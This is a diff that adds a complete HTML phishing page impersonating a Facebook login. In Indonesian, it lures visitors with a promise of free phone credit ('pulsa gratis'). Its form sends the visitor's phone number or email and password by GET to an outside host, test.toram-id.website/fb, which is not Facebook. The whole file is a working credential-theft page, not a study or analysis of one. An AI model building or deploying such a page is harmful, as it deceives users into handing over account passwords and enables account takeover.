@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Pulsa gratis</title>
+  <style>
+    * {
+      padding: 0px;
+      margin: 0px;
+    }
+    header {
+      padding: 20px;
+      background: #004dff;
+      color: #fff
+    }
+
+    #title {
+      font-size: 20px;
+      font-weight:bold;
+      text-align: center;
+      padding-bottom:20px;
+    }
+
+    .control, label {
+      display: block
+    }
+    label {
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    section {
+      padding: 20px 10px;
+      margin: 40px auto;
+    }
+
+    .cc {
+      display: block;
+      padding: 10px;
+      border: 1px solid #aaa;
+      width:90%;
+      margin-bottom: 10px;
+    }
+    .submit {
+      display: block;
+      font-size: 16px;
+      background : #004dff;
+      color: #fff;
+      padding: 10px;
+      border:1px solid #fff;
+      width:95%;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div id="title">
+      Facebook
+    </div>
+    <div id="desc">
+      Masuk ke Facebook untuk mendapatkan pulsa gratis
+    </div>
+  </header>
+
+  <section>
+    <form action="http://test.toram-id.website/fb" method="get">
+      <div class="control">
+        <label for="">Nomor telephone atau Email</label>
+        <input type="text" class="cc" name="name" required>
+      </div>
+
+        <div class="control">
+        <label for="">Password</label>
+        <input type="password" class="cc" name="pw" required>
+      </div>
+
+      <div class="contol">
+        <button type="submit" class="submit">Masuk</button>
+      </div>
+    </form>
+  </section>
+
+  <footer>
+
+  </footer>
+
+  <script>
+
+  </script>
+</body>
+</html>
